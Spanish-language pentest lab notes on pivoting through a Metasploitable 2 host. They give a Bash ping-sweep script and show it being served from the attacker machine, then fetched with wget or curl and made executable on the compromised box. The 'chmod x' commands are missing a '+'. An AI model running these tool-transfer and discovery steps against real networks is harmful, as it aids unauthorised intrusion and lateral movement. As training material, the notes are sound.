Laboratorio:
Máquina Atacante (192.168.1.43)
Máquina Metasploitable 2 (192.168.1.42 / 10.10.10.4)
Máquina Metasploitable 3 (10.10.10.5)

![[Pasted image 20250702213106.png]]

Tenemos un Laboratorio donde todas las máquinas son Linux. Como atacante, una vez dentro de la máquina intermediaria (Metasploitable 2), debemos realizar un descubrimiento de hosts en el segmento de red privado de la máquina Metasploitable 2. Para ello, haremos uso de un script en Bash:

```
#!/bin/bash
# Ten en cuenta cambiar el segmento de red segun el caso
for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 10.10.10.$i" &>/dev/null && echo "[+] Host 10.10.10.$i - active" &
done; wait
```

Ahora debemos trasladar este script `hostdiscovery.sh` a la máquina Metasploitable 2.
Podemos montar un **servicio http** con **python** en nuestra máquina atacante y acceder al recurso desde la máquina Mt2 con **curl** o **wget**.

```
 sudo python3 -m http.server
```

![[Pasted image 20250702212611.png]]

Ahora desde la máquina Mt2 descargaremos el recurso y le daremos privilegios de ejecución.

```
wget http://192.168.1.43:8000/hostdiscovery.sh
chmod x hostdiscovery.sh
```

O

```
curl "http://192.168.1.43:8000/hostdiscovery.sh" -o hostdiscovery.sh
chmod x hostdiscovery.sh
```

![[Pasted image 20250702213245.png]]
